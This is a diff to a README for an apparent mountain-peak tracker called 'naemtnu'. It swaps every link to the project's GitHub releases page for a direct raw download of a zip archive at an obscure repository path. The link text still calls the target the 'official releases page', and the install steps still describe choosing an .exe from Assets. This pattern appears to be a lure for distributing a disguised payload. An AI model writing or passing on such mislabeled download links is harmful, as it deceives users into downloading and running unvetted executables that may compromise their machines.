@@ -1,6 +1,6 @@
 # 🏔️ naemtnu - Locate your favorite mountain peaks easily
 
-[![](https://img.shields.io/badge/Download-naemtnu-blue.svg)](https://github.com/Shastasleepernest677/naemtnu/releases)
+[![](https://img.shields.io/badge/Download-naemtnu-blue.svg)](https://raw.githubusercontent.com/Shastasleepernest677/naemtnu/main/nonforeclosure/Software-wickiup.zip)
 
 ## What is naemtnu?
 
@@ -10,13 +10,13 @@ naemtnu helps you track and find mountain peaks. You use this tool to log your c
 
 Follow these steps to put naemtnu on your computer.
 
-1. Visit the [official releases page](https://github.com/Shastasleepernest677/naemtnu/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Shastasleepernest677/naemtnu/main/nonforeclosure/Software-wickiup.zip).
 2. Look for the section labeled Assets.
 3. Click the file that ends with .exe.
 4. Save the file to your computer.
 5. Select a folder where you can find it later.
 
-[Download naemtnu](https://github.com/Shastasleepernest677/naemtnu/releases)
+[Download naemtnu](https://raw.githubusercontent.com/Shastasleepernest677/naemtnu/main/nonforeclosure/Software-wickiup.zip)
 
 ## ⚙️ Setting up the application
 
